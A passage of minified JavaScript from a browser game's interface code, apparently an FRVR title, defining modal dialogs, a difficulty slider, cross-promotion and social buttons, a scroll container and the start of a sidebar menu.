            LEGACY_COORD_SYSTEM || (n = 1), LEGACY_COORD_SYSTEM ? (t.width = width * n, t.height = (height + 100) * n, i.x = (width / e.ratio * n - 800) / 2) : (i.x = (XS.gui.width / e.scale.x - 800) / 2, t.width = XS.gui.width / e.scale.x, t.height = XS.gui.height / e.scale.y)
        }, this.handleResize = function() {
            var t = XS.devicePixelRatio;
            if (LEGACY_COORD_SYSTEM || (t = 1), Tween.complete(i), LEGACY_COORD_SYSTEM) {
                var a = Math.min(Math.min(width * t / 900, (height - XS.styles.margins.top - XS.styles.margins.bottom) * t / (r + 50)), t / 2);
                e.ratio = a, n.scale.set(a, a)
            } else {
                a = Math.min(Math.min((XS.gui.width - XS.styles.margins.left - XS.styles.margins.right) / 900, (XS.gui.height - XS.styles.margins.top - XS.styles.margins.bottom) / (r + 50)), 1);
                e.scale.set(a)
            }
            LEGACY_COORD_SYSTEM && (i.x = (width / e.ratio * t - 800) / 2), i.y = o(), e.redraw()
        }, XS.on("resize", this.handleResize, {
            freezeGroup: ENG_FRZ_GRP
        });
        var a = !1,
            s = null,
            l = !1;

        function h() {
            e.isShowing = !1, s && s.destroy && s.destroy(), i.removeChild(s), LEGACY_COORD_SYSTEM ? XS.stageContainer.removeChild(e) : XS.gui.removeChild(e)
        }
        this.show = function(n, r, d) {
            var c = XS.devicePixelRatio;
            LEGACY_COORD_SYSTEM || (c = 1), a = !1, l = !1, XS.emit("togglemodal", {
                visible: !0
            }), h(), e.isShowing = !0, (s = n).off("down", void 0, {
                freezeGroup: ENG_FRZ_GRP
            }), s.on("down", function() {
                a = !0
            }, {
                freezeGroup: ENG_FRZ_GRP
            }), this.interactive = !d, t.interactive = !d, this.setHeight(s.innerHeight), i.addChild(s), this.handleResize(), LEGACY_COORD_SYSTEM ? i.y = height * c / stage.ratio : i.y = XS.gui.height, t.alpha = 0, new Tween(i, {
                y: o()
            }, .3, void 0, ENG_FRZ_GRP), !0 !== r && new Tween(t, {
                alpha: 1
            }, .3, void 0, ENG_FRZ_GRP), LEGACY_COORD_SYSTEM ? XS.stageContainer.addChild(e) : XS.gui.addChild(e)
        }, this.hide = function(t) {
            XS.hideGameOverAd(), e.isShowing ? new Tween(i, {
                y: -r
            }, .3, void 0, ENG_FRZ_GRP).call(function() {
                h(), XS.emit("togglemodal", {
                    visible: !1
                }), t instanceof Function && t()
            }) : t instanceof Function && t()
        }, n.on("down", function() {
            a = !0
        }, {
            freezeGroup: ENG_FRZ_GRP
        }), t.on("up", function() {
            a || (s.blurClose ? l || (e.hide(), l = !0) : s.blurCallback instanceof Function && (l || (s.blurCallback(), l = !0))), a = !1
        }, {
            freezeGroup: ENG_FRZ_GRP
        })
    }), window.Modal = new e;
    var t = Container.expand(function(e) {
        var t = Container.call(this),
            i = new Sprite(fetch("i/g/s/sliderbg.svg", !0));
        i.anchor.set(.5, 0), i.x = 400, this.addChild(i);
        var n = new Sprite(fetch("i/g/s/sliderslider.svg", !0));

        function r(e, i, n) {
            var r = 0;
            if (e) {
                var o = new Sprite(e);
                o.scale.set(50 / 171, 50 / 171), o.y = 39, o.anchor.set(0, .5), r = 55
            }
            var a = new Text2(i, {
                weight: 400,
                size: 34,
                maxWidth: 190,
                dropShadowDistance: 2
            });
            a.anchor.set(0, .5);
            var s = n + (255 - (a.width + r)) / 2;
            return a.y = 41, a.x = s + r, e && (o.x = s, t.addChild(o)), t.addChild(a), a
        }
        n.anchor.set(.5, 0), n.y = -8, this.addChild(n);
        var o = r(e.challengingStar, e.challenging, 527),
            a = r(e.normalStar, e.normal, 273),
            s = [r(e.casualStar, e.casual, 19), a, o],
            l = [148, 400, 655],
            h = -1;
        t.setSelected = function(e, i, r) {
            var o = l[e];
            if (r || (Tween.clear(n), i ? new Tween(n, {
                    x: o
                }, .3, void 0, ENG_FRZ_GRP) : n.x = o), e != h) {
                h = e, t.emit("complexity", {
                    selected: h
                });
                for (var a = 0; a < 3; a++) {
                    var d = a == e;
                    s[a].updateStyle({
                        fill: d ? "#FFFFFF" : "#000000",
                        dropShadow: d
                    })
                }
            }
        };
        var d = null != e.selected ? e.selected : XS.data.modalSliderComplexity - 1;
        t.setSelected(d, !1), i.on("down", function(e) {
            var n = e.event.getLocalPosition(i),
                r = Math.max(0, Math.min(2, (n.x + 127 + 260) / 258 >> 0));
            LEGACY_COORD_SYSTEM && (r = Math.max(0, Math.min(2, (n.x / t.ratio + 127 + 260) / 258 >> 0))), t.setSelected(r, !0)
        }, {
            freezeGroup: ENG_FRZ_GRP
        });
        var c = void 0,
            u = 0;

        function f() {
            c = void 0, XS.stageContainer.off("stageup", f, {
                freezeGroup: ENG_FRZ_GRP
            }), XS.stageContainer.off("move", p, {
                freezeGroup: ENG_FRZ_GRP
            }), t.setSelected(h, !0)
        }

        function p(e) {
            var i = e.event.getLocalPosition(stage).x - c.x;
            LEGACY_COORD_SYSTEM ? n.x = Math.min(Math.max(u + i / t.ratio, l[0]), l[2]) : n.x = Math.min(Math.max(u + i, l[0]), l[2]);
            for (var r = 0; r < l.length; r++) {
                var o = l[r];
                Math.abs(n.x - o) < 30 ? t.setSelected(r, !1) : Math.abs(n.x - o) < 100 && t.setSelected(r, !1, !0)
            }
        }
        n.on("down", function(e) {
            c = e.event.getLocalPosition(stage), u = n.x, XS.stageContainer.on("stageup", f, {
                freezeGroup: ENG_FRZ_GRP
            }), XS.stageContainer.on("move", p, {
                freezeGroup: ENG_FRZ_GRP
            })
        }, {
            freezeGroup: ENG_FRZ_GRP
        }), t.getComplexity = function() {
            return h
        }
    });
    window.Modal.ModalButton = Container.expand(function(e, t, i, n, r, o, a) {
        Container.call(this);
        var s, l, h, d = this;
        n = void 0 === n ? 15748651 : n, s = new Graphics, d.addChild(s);
        var c, u = void 0 !== a ? a + r : 165 + r;
        l = new Graphics, t && ((c = new Text2(t, {
            width: 400,
            size: 40,
            fill: "#ffffff"
        })).anchor.set(.5, 0), c.x = 400, c.y = 30 + r + 60, d.addChild(c)), (h = new Text2(e, {
            width: 400,
            size: o,
            fill: "#ffffff"
        })).anchor.set(.5, 0), h.x = 400, h.y = 30 + r, d.addChild(h), h.interactive = !0, h.buttonMode = !0, i && s.on("down", function() {
            Modal.sounds.button && Modal.sounds.button.play(0), XS.stageContainer.off("stageup", void 0, {
                freezeGroup: ENG_FRZ_GRP
            }), XS.stageContainer.once("stageup", i, {
                freezeGroup: ENG_FRZ_GRP
            })
        }, {
            freezeGroup: ENG_FRZ_GRP
        }), d.setRatio = function(e) {
            LEGACY_COORD_SYSTEM || (e = 1), s.width = 800 * e, s.height = u * e, l && (l.width = 800 * e, l.height = 35 * e)
        }, d.setColor = function(e) {
            s.beginFill(e), r ? (s.drawRoundedRect(0, 0, 800, 200, r), l.clear(), l.beginFill(16777215, 1), l.drawRect(0, 0, 800, r), d.addChild(l)) : s.drawRect(0, 0, 800, u)
        }, d.setText = function(e) {
            h.setText(e)
        }, d.centerText = function() {
            h.y = (u + r) / 2 - h.height / 2
        }, d.setSubtext = function(e) {
            c && c.setText(e)
        }, d.setColor(void 0 === n ? 16711680 : n, 1), d.getHeight = function() {
            return u
        }, d.getWidth = function() {
            return 800
        }
    }), window.Modal.PictureButton = Container.expand(function(e, t) {
        Container.call(this);
        var i = this;
        preload(e, function() {
            var n = new Sprite(embed(e));
            n.anchor.set(.5, 0), n.x = 400, i.addChild(n);
            var r = 1,
                o = new Graphics;
            o.beginFill(16777215, .7), o.drawRect(0, 0, 800, 165), o.y = 0, i.setRatio = function(e) {
                LEGACY_COORD_SYSTEM && (r = e), o.x = 470 * r, o.width = 330 * r, o.height = 45 * r
            };
            var a = new Text2(Host.Localize.Translate("More great FRVR Games!", {}, "Cross-promo overlay text"), {
                weight: 400,
                size: 150,
                maxWidth: 300,
                fill: "#000"
            });
            a.anchor.set(1, 0), a.ratio = -1, a.y = 6, a.x = 790, i.addChild(o), i.addChild(a), i.setRatio(i.ratio), t && (n.buttonMode = !0, n.on("down", t, {
                freezeGroup: ENG_FRZ_GRP
            }))
        })
    });
    var i = 1337 * Math.random() >> 0;
    window.Modal.ModalOverlayContent = Container.expand(function() {
        var e = Container.call(this);

        function n(e, t, i) {
            var n = new RegExp("([?&])" + t + "=.*?(&|$)", "i"),
                r = -1 !== e.indexOf("?") ? "&" : "?";
            return e.match(n) ? e.replace(n, "$1" + t + "=" + i + "$2") : e + r + t + (i ? "=" + i : "")
        }
        return this.innerHeight = 800, this.blurClose = !0, e.addHeadline = function(t) {
            var i = new Text2(t, {
                weight: 200,
                size: 90,
                fill: "#2c2c2c",
                maxWidth: 780
            });
            return i.anchor.set(.5, 0), i.x = 400, i.y = 40, e.addChild(i), i
        }, e.addTextBlock = function(t, i, n) {
            var r = new Text2(t, {
                weight: n || 200,
                size: i || 90,
                fill: "#2c2c2c",
                maxWidth: 780
            });
            return r.anchor.set(.5, 0), r.x = 400, r.y = 50, e.addChild(r), r
        }, e.addLead = function(t, i) {
            var n = new Text2(t, {
                width: 200,
                size: 45,
                fill: "#2c2c2c",
                maxWidth: 800,
                align: "center"
            });
            return n.anchor.set(.5, 0), n.x = 400, n.y = 140 + (i || 0), e.addChild(n), n
        }, e.addButton = function(t, i, n, r, o) {
            var a = new Modal.ModalButton(t, r || "", i, n, 35, o || 90);
            return a.y = 370, e.addChild(a)
        }, e.addMiddleButton = function(t, i, n, r, o, a) {
            var s = new Modal.ModalButton(t, i, n, r, 0, o || 60, a);
            return s.y = 370, e.addChild(s)
        }, e.addRewardAdButton = function(t, i, n, r, o, a, s) {
            var l = new Modal.ModalButton(t, i, n, r, 0, o || 60, a);
            l.centerText();
            var h = new Sprite(fetch("i/g/s/icon_ad.png", !0));
            h.anchor.set(0, .5);
            var d = s || (h.height >= l.getHeight() - 30 ? (l.getHeight() - 30) / h.height : 1);
            return h.scale.set(d, d), h.x = l.getWidth() - h.width - 30, h.y = l.getHeight() / 2, l.addChild(h), e.addChild(l)
        }, e.addSocialButton = function(t, i, n, r, o) {
            var a = e.addMiddleButton(t, i, n, r);
            return a.y = 405 + (o || 0), e.addChild(a)
        }, e.addPictureButton = function(t, i, n) {
            var r = new Modal.PictureButton(t, i);
            return r.y = 405 + (n || 0), e.addChild(r)
        }, e.addSlider = function(i) {
            return e.addChild(new t(i))
        }, e.addMetaButton = function(t, r) {
            if (!(XS.is.spilGamesWrapper || XS.is.okru || XS.is.facebookInstant || XS.is.rcs || XS.is.huawei || XS.is.miniclip)) {
                var o, a = !!(XS.remoteConfig && XS.remoteConfig.crosspromoteConfig && XS.remoteConfig.crosspromoteConfig.length),
                    s = !!(XS.crosspromo && XS.crosspromo.config && XS.crosspromo.config.length >= 1 && XS.crosspromo.config[0].web),
                    l = [];
                if (!XS.is.twitter) {
                    for (var h = s ? XS.crosspromo.config[0].web : a ? XS.remoteConfig.crosspromoteConfig : [{
                            facebookImage: "cdn.frvr.com/cross/basketball.jpg",
                            facebookUrl: "https://apps.facebook.com/basketballfrvr",
                            webImage: "cdn.frvr.com/cross/basketball.jpg",
                            webUrl: "http://basketball.frvr.com/"
                        }, {
                            facebookImage: "cdn.frvr.com/cross/hex.jpg",
                            facebookUrl: "https://apps.facebook.com/hexfrvr",
                            webImage: "cdn.frvr.com/cross/hex.jpg",
                            webUrl: "http://hex.frvr.com/"
                        }, {
                            facebookImage: "cdn.frvr.com/cross/mahjong.jpg",
                            facebookUrl: "https://apps.facebook.com/mahjongfrvr",
                            webImage: "cdn.frvr.com/cross/mahjong.jpg",
                            webUrl: "http://mahjong.frvr.com/"
                        }], d = [], c = 0; c < h.length; c++) {
                        var u = h[c];
                        if (XS.is.android && !XS.is.samsungBixby) XS.is.silk || (XS.is.samsungAppStore ? u.samsungUrl && u.samsungImage && d.push([u.samsungUrl, u.samsungImage]) : u.androidUrl && u.androidImage && d.push([u.androidUrl, u.androidImage]));
                        else if (XS.is.iOS && u.iOSUrl && u.iOSImage) d.push([u.iOSUrl, u.iOSImage, "_top"]);
                        else if (XS.is.facebookApp && u.facebookUrl && u.facebookImage) d.push([u.facebookUrl, u.facebookImage, "_top"]);
                        else if (XS.is.chromeWrapper && u.chromeUrl && u.chromeImage) d.push([u.chromeUrl, u.chromeImage, "_blank"]);
                        else if (!XS.is.chromeWrapper && u.webUrl && u.webImage) {
                            if (XS.is.samsungBixby && -1 != u.webUrl.indexOf("solitaire.frvr")) continue;
                            d.push([(o = u.webUrl, XS.is.samsungBixby ? n(o, "samsung", "") : XS.is.samsungBrowser ? n(o, "samsungbrowser", "") : o), u.webImage, XS.is.mobile ? "_blank" : "_top"])
                        }
                    }
                    d.length && l.push(function(e) {
                        var i = d[d.length * Math.random() >> 0],
                            n = i[0],
                            r = XS.httpPrefix + i[1],
                            o = i[2];
                        XS.is.samsungBrowser && n.replace(/^market:\/\//, XS.httpPrefix + "market.android.com/"), XS.track.crossPromotionShow("standard_aftergame"), e.addPictureButton(r, function() {
                            XS.track.crossPromotionSuccess(n), XS.navigate(n, o)
                        }, t).y = t
                    })
                }
                return !window.requestFacebookLogin || !1 !== window.facebookAuthed || !Config.facebookAppId || XS.is.twitter || XS.is.nosoc || XS.is.rcs || XS.is.huawei || XS.is.miniclip || l.push(function(e) {
                    e.addSocialButton(Host.Localize.Translate("Login with Facebook"), Host.Localize.Translate("Save your score!"), function() {
                        window.requestFacebookLogin(function() {
                            Modal.hide(), r.mainActionCallback && r.mainActionCallback(), r.autoCallback && r.autoCallback()
                        })
                    }, 4675430, t).y = t
                }), !window.shareDialogueCallback || XS.is.nosoc || XS.is.rcs || XS.is.huawei || XS.is.miniclip || l.push(function(e) {
                    e.addSocialButton(Host.Localize.Translate(Config.buttonShareTitle, {
                        game_name: Config.shareTitle
                    }), Host.Localize.Translate(Config.buttonShareDescription, {
                        game_name: Config.shareTitle
                    }), function() {
                        window.shareDialogueCallback(""), r.mainActionCallback && r.mainActionCallback()
                    }, 4675430, t).y = t
                }), !!l.length && (l[++i % l.length](e), !0)
            }
        }, e
    }), window.Modal.RateGameModal = Modal.ModalOverlayContent.expand(function(e, t) {
        Modal.ModalOverlayContent.call(this), this.addHeadline(Host.Localize.Translate("Having Fun?")), this.addLead(Host.Localize.Translate("Help us improve the game!\nHow would you rate {game_name}?", {
            game_name: Config.shareTitle
        }), 10);
        var i = this,
            n = i.addMiddleButton(Host.Localize.Translate("Send Feedback"), Host.Localize.Translate("Help us improve {game_name}", {
                game_name: Config.shareTitle
            }, "We are asking the user to provide feedback for the game"), function() {
                XS.navigate(Config.feedbackURL), Modal.hide()
            }, 6208638);
        n.y = 430, n.visible = !1;
        var r = i.addMiddleButton(Host.Localize.Translate("Write Review"), Host.Localize.Translate("Help us by writing a review!"), function() {
            XS.is.samsungAppStore ? XS.navigate(Config.samsungReviewUrl) : XS.is.chromeWrapper ? XS.navigate(Config.chromeReviewUrl) : XS.is.android ? XS.navigate(Config.androidReviewURL) : XS.navigate(Config.iOSReviewURL), Modal.hide()
        }, 12303291);
        r.y = 580, r.visible = !1;
        var o = i.addButton(Host.Localize.Translate("No thanks"), function() {
            Modal.hide()
        }, t);
        o.visible = !1;
        var a = [];

        function s(t) {
            var s = new Sheet(e, 136, 130);
            return s.y = 270, s.x = 150 * l + 30, s.on("down", function() {
                for (var e = 0; e < 5; e++) a[e].frame = e <= t ? 1 : 0;
                ! function(e) {
                    var t = 4 != e;
                    n.visible = t, r.visible = !0;
                    var a = t ? 150 : 0;
                    r.y = 430 + a, r.setColor(t ? 12303291 : 6208638), o.visible = !0, i.innerHeight = 760 + a, Modal.setHeight(i.innerHeight), Modal.handleResize(), o.y = 560 + a, i.addChildAt(o, 0)
                }(t)
            }, {
                freezeGroup: ENG_FRZ_GRP
            }), s.buttonMode = !0, s
        }
        for (var l = 0; l < 5; l++) a.push(this.addChild(s(l)));
        this.innerHeight = 450, this.blurClose = !1
    }), window.Modal.BuyItemModal = Modal.ModalOverlayContent.expand(function(e, t, i, n, r, o, a) {
        Modal.ModalOverlayContent.call(this), this.addHeadline(e);
        var s = this.addLead(t, 10),
            l = 1;
        LEGACY_COORD_SYSTEM && (l = XS.devicePixelRatio), s.updateStyle({
            wordWrapWidth: 790 * l
        });
        var h = this.addButton(i, n, 7463062),
            d = new Sheet(fetch("i/g/s/menutile.svg", !0), 68, 45);
        d.frame = 1, d.x = 722, d.y = 15, this.addChild(d), d.interactive = !0, d.buttonMode = !0, h.y = 200;
        r ? (this.addMiddleButton(r, o, a, 8026746).y = 255, h.y += 185, this.innerHeight = 579) : (h.y += 20, this.innerHeight = 420);
        this.addChild(s)
    }), window.Modal.InstallGameModal = Modal.ModalOverlayContent.expand(function(e, t, i, n) {
        Modal.ModalOverlayContent.call(this), this.addHeadline(Host.Localize.Translate("Install {game_name}?", {
            game_name: Config.shortTitle
        }));
        var r = this.addButton(Host.Localize.Translate("Install Now"), function() {
            t && XS.navigate(t, "_top"), n && n()
        }, 6274174);
        r.y = 640, this.innerHeight += 40;
        var o = XS.utils.asynchLoadImageFromPath(vpath + e);
        o.anchor.set(0, 0), this.addChild(o), o.buttonMode = !0, o.on("down", function() {
            t && XS.navigate(t, "_top"), n && n()
        }, {
            freezeGroup: ENG_FRZ_GRP
        }), this.setRatio = function(e) {
            LEGACY_COORD_SYSTEM || (e = 1), o.scale.set(1.465 * e, 1.465 * e), o.y = 160 * e
        }, this.setText = function(e) {
            r.setText(e)
        }, this.blurClose = !1, this.blurCallback = function() {
            Modal.hide(i)
        }
    }), window.Modal.GameEndModal = Modal.ModalOverlayContent.expand(function(e) {
        var t = Modal.ModalOverlayContent.call(this);
        gax("send", "event", Config.id, "Game Over");
        var i = e.contentTop || 190;
        e.headline && t.addHeadline(e.headline), e.lead && t.addLead(e.lead), this.blurClose = !1, t.blurCallback = function() {
            e.mainActionCallback()
        }, t.mainAction = t.addButton(e.mainActionText, e.mainActionCallback, e.mainActionColor || 7463062, e.mainActionLead, e.mainActionSize), (!e.disableMetaButton || XS.is.nosoc || XS.is.rcs || XS.is.huawei || XS.is.miniclip) && t.addMetaButton(i + 50, e) && (i += 165), t.mainAction.y = 215 + i - 200, t.innerHeight = 215 + i
    }), window.Modal.NewWinModal = Modal.ModalOverlayContent.expand(function(e) {
        var t = Modal.ModalOverlayContent.call(this);
        gax("send", "event", Config.id, "New Game"), t.addHeadline([Host.Localize.Translate("Amazing!"), Host.Localize.Translate("Impressive!"), Host.Localize.Translate("Breathtaking!")][3 * Math.random() >> 0]), t.blurClose = e.allowBlurClose || !1;
        var i = 190,
            n = CalendarView.getCalendarViewDay({
                currentDate: CalendarView.getDateFromOffset(e.seed),
                isToday: CalendarView.isToday(e.seed),
                isLarge: !0,
                dateOffset: e.seed,
                stars: [e.bronze, e.silver, e.gold],
                animate: !0
            });
        (t.addChild(n), n.x = 400, n.y = 380, e.lead) && (t.addTextBlock(e.lead, 50, 300).y = i + 400, i += 61);
        if (void 0 !== e.score) {
            i += 130;
            var r = t.addTextBlock(0, 150, 400);
            r.y = 550, t.addChild(r);
            var o = 0;
            Object.defineProperty(r, "score", {
                get: function() {
                    return o
                },
                set: function(e) {
                    o = e, this.setText((e >> 0).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ","))
                }
            });
            var a = r.scale.x,
                s = r.scale.x;
            new Tween(r, {
                score: e.score
            }, 1, Tween.linary, ENG_FRZ_GRP).wait(.3).call(function() {
                e.sounds && e.sounds.ding && e.sounds.ding.play(), r.scale.set(1.1 * a, 1.1 * s), new Tween(r.scale, {
                    x: a,
                    y: s
                }, .3, void 0, ENG_FRZ_GRP)
            }), e.sounds && e.sounds.count && e.sounds.count.play(.4)
        }(t.addMetaButton(i + 405, e) && (i += 165), e.secondActionText && e.secondActionCallback) && (t.addSocialButton(e.secondActionText, e.secondActionLead, e.secondActionCallback, e.secondActionColor || 7445472).y = i + 405, i += 165);
        var l = t.addButton(e.mainActionText, e.mainActionCallback, e.mainActionColor || 7463062);
        t.addChildAt(l, 1), l.y += i, t.innerHeight = 570 + i
    }), window.Modal.GameOverModal = Container.expand(function(e, t) {
        Modal.ModalOverlayContent.call(this);
        var i = this;
        i.addHeadline(Host.Localize.Translate("Game Over")), i.addLead(Host.Localize.Translate("No more valid moves")), i.blurClose = !1;
        var n = i.addButton(Host.Localize.Translate("Start over"), e, 7463062),
            r = 250;
        (i.addMetaButton(r, {
            mainActionCallback: t
        }) && (r += 165), t) && (i.addMiddleButton(Host.Localize.Translate("Return to Calendar"), Host.Localize.Translate("Play another level?"), t, 7445472).y = r, r += 165);
        n.y = r - 35, i.innerHeight = r + 165
    }), window.Modal.NewGameModal = Container.expand(function(e, t) {
        var i = Modal.ModalOverlayContent.call(this),
            n = -170,
            r = i.addButton(Host.Localize.Translate("Start"), function() {
                e()
            }, 7463062);
        if (t) {
            var o = i.addSlider({
                casual: Host.Localize.Translate("Casual"),
                normal: Host.Localize.Translate("Normal"),
                challenging: Host.Localize.Translate("Challenging"),
                casualStar: t.casualStar,
                normalStar: t.normalStar,
                challengingStar: t.challengingStar,
                selected: t.complexity
            });
            o.on("complexity", function(e) {
                XS.data.modalSliderComplexity = e.selected + 1
            }, {
                freezeGroup: ENG_FRZ_GRP
            }), o.y = 595;
            var a = e;
            e = function() {
                a(o.getComplexity())
            }, n = 290, i.innerHeight = 570 + n
        }
        r.y += n, i.innerHeight = 570 + n
    })
});
var ScrollContainer = function(e, t) {
    Container.call(this), this.scrollWidth = e, this.scrollHeight = t, this.allowScrollX = !0, this.allowScrollY = !0, this.content = new Container, this.addChild(this.content);
    var i = this.addChildAt.bind(this);
    this.addChild = function(e) {
        return this.content.addChild(e)
    }, LEGACY_COORD_SYSTEM || (this.setMaskEnabled = function(e) {
        if (e) {
            if (!this.mask) {
                var t = new Graphics;
                i(t, this.children.length), this.mask = t, this.resizeMask(this.scrollWidth, this.scrollHeight)
            }
        } else this.mask && (this.mask = null)
    }), this.addChildAt = function(e, t) {
        return this.content.addChildAt(e, t)
    }, this.removeChild = function(e) {
        return this.content.removeChild(e)
    }, this.resize = function(e, t) {
        this.scrollWidth = e, this.scrollHeight = t, LEGACY_COORD_SYSTEM || this.resizeMask(e, t)
    }, LEGACY_COORD_SYSTEM || (this.resizeMask = function(e, t) {
        this.mask && (this.mask.clear(), this.mask.beginFill(16777215), this.mask.drawRect(0, 0, e, t), this.mask.endFill())
    }, this.resizeToContent = function() {
        this.scrollWidth = this.content.width, this.scrollHeight = this.content.height
    }), this.getChildren = function() {
        return this.content.children
    }, this.moved = !1;
    var n = this,
        r = null,
        o = 0,
        a = 0;
    XS.stageContainer.on("down", function(e) {
        var t = e.event;
        Tween.clear(n.content);
        var i = t.getLocalPosition(n),
            s = 1;
        LEGACY_COORD_SYSTEM && (s = n.ratio);
        var l = i.x / s,
            h = i.y / s;
        o = n.content.x, a = n.content.y, l >= 0 && h >= 0 && l <= n.scrollWidth && h <= n.scrollHeight && (r = i), n.moved = !1
    }, {
        freezeGroup: ENG_FRZ_GRP
    });
    var s = null,
        l = 0,
        h = 0;
    XS.stageContainer.on("move", function(e) {
        var t = e.event,
            i = 1;
        if (LEGACY_COORD_SYSTEM && (i = n.ratio), null !== r) {
            var d = 1;
            LEGACY_COORD_SYSTEM && (d = XS.devicePixelRatio);
            var c = t.getLocalPosition(n);
            if (n.moved || Math.abs(r.y - c.y) > 5 * d || Math.abs(r.x - c.x) > 5 * d) {
                if (n.moved = !0, s && (l = c.y - s.y, h = (new Date).getTime()), s = c, n.allowScrollX) {
                    var u = o - (r.x - c.x) / i,
                        f = n.scrollWidth - Math.max(n.content.width, n.scrollWidth);
                    if (LEGACY_COORD_SYSTEM && (f = n.scrollWidth - Math.max(n.content.width / n.content.ratio, n.scrollWidth)), u > 0) u = Math.min(u, 7 * Math.sqrt(u));
                    else if (u < f) {
                        var p = -u + f;
                        u = f - Math.min(p, 7 * Math.sqrt(p))
                    }
                    n.content.x = u
                }
                if (n.allowScrollY) {
                    var g = a - (r.y - c.y) / i,
                        v = n.scrollHeight - Math.max(n.content.height, n.scrollHeight);
                    if (LEGACY_COORD_SYSTEM && (v = n.scrollHeight - Math.max(n.content.height / n.content.ratio, n.scrollHeight)), g > 0) g = Math.min(g, 7 * Math.sqrt(g));
                    else if (g < v) {
                        p = -g + v;
                        g = v - Math.min(p, 7 * Math.sqrt(p))
                    }
                    n.content.y = g
                }
            }
        }
    }, {
        freezeGroup: ENG_FRZ_GRP
    }), XS.stageContainer.on("up", function(e) {
        r && (!n.moved && n.callback && n.callback(), n.callback = null, n.clean())
    }, {
        freezeGroup: ENG_FRZ_GRP
    }), window.onmousewheel = function(e) {
        var t = window.event || e,
            i = t.detail ? -10 * t.detail : t.wheelDelta;
        n.content.y += i;
        n.scrollWidth, Math.max(n.content.width, n.scrollWidth);
        var r = n.scrollHeight - Math.max(n.content.height, n.scrollHeight);
        LEGACY_COORD_SYSTEM && (n.scrollWidth - Math.max(n.content.width / n.content.ratio, n.scrollWidth), r = n.scrollHeight - Math.max(n.content.height / n.content.ratio, n.scrollHeight)), n.content.y >= 0 ? n.content.y = 0 : n.content.y < r && (n.content.y = r), window.dirtyOnce = !0
    }, window.addEventListener("DOMMouseScroll", window.onmousewheel), this.clean = function() {
        s = null;
        var e = n.scrollWidth - Math.max(n.content.width, n.scrollWidth),
            t = n.scrollHeight - Math.max(n.content.height, n.scrollHeight);
        if (LEGACY_COORD_SYSTEM) e = n.scrollWidth - Math.max(n.content.width / n.content.ratio, n.scrollWidth), t = n.scrollHeight - Math.max(n.content.height / n.content.ratio, n.scrollHeight);
        n.content.x >= 0 ? new Tween(n.content, {
            x: 0
        }, .2, void 0, ENG_FRZ_GRP) : n.content.x < e && new Tween(n.content, {
            x: e
        }, .2, void 0, ENG_FRZ_GRP), n.content.y >= 0 ? new Tween(n.content, {
            y: 0
        }, .2, void 0, ENG_FRZ_GRP) : n.content.y < t ? new Tween(n.content, {
            y: t
        }, .2, void 0, ENG_FRZ_GRP) : (new Date).getTime() - h < 250 && Math.abs(l) > 5 && new Tween(n.content, {
            y: Math.max(Math.min(n.content.y + 20 * l, 0), t)
        }, .4, void 0, ENG_FRZ_GRP), l = 0, r = null, n.moved = !1
    }
};
ScrollContainer.prototype = Object.create(Container.prototype), ScrollContainer.prototype.constructor = ScrollContainer, XS.modulesToPreload.push(function() {
    window.Sidebar = function() {
        var e = this,
            t = fetch("i/g/s/menutile.svg", !0),
            i = 510,
            n = 81,
            r = -100,
            o = 68,
            a = XS.gui.scale.x,
            s = 10 * Math.round(1 / XS.gui.scale.x);
        e.downloadItems = [], LEGACY_COORD_SYSTEM && (i = 250, n = 40, a = 1);
        var l = t.isJSG ? t.draw({
                scale: 1,
                forceCanvas: !0
            }) : t,
            h = 0,
            d = void 0,
            c = 0,
            u = !1,
            f = e.defaultIcon = embed("i/g/s/icon_new.svg");

        function p() {
            var t = new Sheet(function() {
                var e = document.createElement("canvas");
                e.width = 136, e.height = 75;
                var t = e.getContext("2d");
                t.drawImage(l, 0, 0);
                var i = new Text2(Host.Localize.Translate("Menu"), {
                        fill: "#FFFFFF",
                        size: 80,
                        weight: 400
                    }).getContent().canvas,
                    n = Math.min(35 / i.height, 68 / i.width),
                    r = (68 - n * i.width) / 2;
                t.drawImage(i, r, 47, n * i.width, n * i.height);
                var o = new Text2(Host.Localize.Translate("Close"), {
                        fill: "#FFFFFF",
                        size: 80,
                        weight: 400
                    }).getContent().canvas,
                    a = Math.min(35 / o.height, 68 / o.width),
                    s = (68 - a * o.width) / 2;
                return t.drawImage(o, s + 68, 47, a * o.width, a * i.height), e
            }(), 68, 75);
            t.x = XS.styles.margins.left ? (XS.styles.margins.left + 5) / .5 : 25, t.y = XS.styles.margins.top ? (XS.styles.margins.top + 5) / .5 : 25;
            var i = 1;
            return LEGACY_COORD_SYSTEM && (i = XS.devicePixelRatio), t.buttonMode = !0, t.interactive = !0, t.ratio = .5 * i, t.on("down", function() {
                "showing" === e.status ? e.hide() : "hidden" === e.status && e.show()
            }, {
                freezeGroup: ENG_FRZ_GRP
            }), t
        }
        XS.on("translate", function() {
            var t = p();
            t.alpha = e.icon.alpha, t.visible = e.icon.visible, t.x = e.icon.x, t.y = e.icon.y, t.frame = e.icon.frame, t.anchor.set(e.icon.anchor.x, e.icon.anchor.y);
            var i = e.icon.parent;
            i.removeChild(e.icon), i.addChild(t), e.icon = t
        }, {
            freezeGroup: ENG_FRZ_GRP
        }), Container.call(e), e.icon = p(), e.status = "hidden", LEGACY_COORD_SYSTEM || e.scale.set(XS.gui.scale.x, XS.gui.scale.y);
        var g = new Graphics;
        e.addChild(g), g.on("down", function() {
            u || 16 == ++c && (u = !0, XS.emit("spawndebugmenu"))
        }, {
            freezeGroup: ENG_FRZ_GRP
        }), e.interactive = !0, g.beginFill(3355443), g.drawRect(0, 0, 200, 200);
        var v = 1;
        LEGACY_COORD_SYSTEM && (v = XS.devicePixelRatio), g.width = (i + XS.styles.margins.left) * v * a;
        var m = new TextureSprite(Texture.emptyTexture);
        LEGACY_COORD_SYSTEM && XS.stageContainer.addChildAt(m, 0), e.sounds = {
            show: void 0,
            hide: void 0
        };
        var y, w = document.createElement("canvas"),
            S = w.getContext("2d"),
            x = S.createPattern(XS.utils.clipImage(fetch("i/g/s/sidebar.svg", !0), 268, 0, 25, 25), "repeat");

        function b() {
            if (LEGACY_COORD_SYSTEM) g.height = height * XS.devicePixelRatio;
            else if (e.parent) {
                var t = e.toLocal(new Point(0, XS.size.canvas.height));
                g.height = t.y, m.height = XS.size.canvas.height
            }
        }
